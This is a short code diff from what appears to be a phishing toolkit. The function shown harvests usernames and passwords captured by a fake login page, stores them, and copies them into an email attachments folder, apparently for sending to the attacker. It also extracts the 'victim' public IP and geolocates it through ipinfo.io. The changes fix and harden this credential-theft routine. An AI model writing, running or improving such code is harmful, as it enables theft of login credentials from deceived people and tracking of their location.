@@ -901,14 +901,13 @@ def getCredentials(port):
             if len(lines) != 0:
                 writeLog('\n {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}'.format(
                     MAIN2, MAIN3, lines))
-                system('touch Server/CapturedData/usernames.txt && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt && rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
+                system("touch Server/CapturedData/usernames.txt && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt && echo -n '' > Server/www/usernames.txt")
 
-        creds.close()
 
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                ip = re.match('Victim Public IP: (.*.*.*)\n', lines).group(1)
+                ip = re.search("Victim Public IP: (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\n,\r]", lines).group(1)
                 user = re.match('Current logged in user: (a-z0-9)\n', lines)
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(
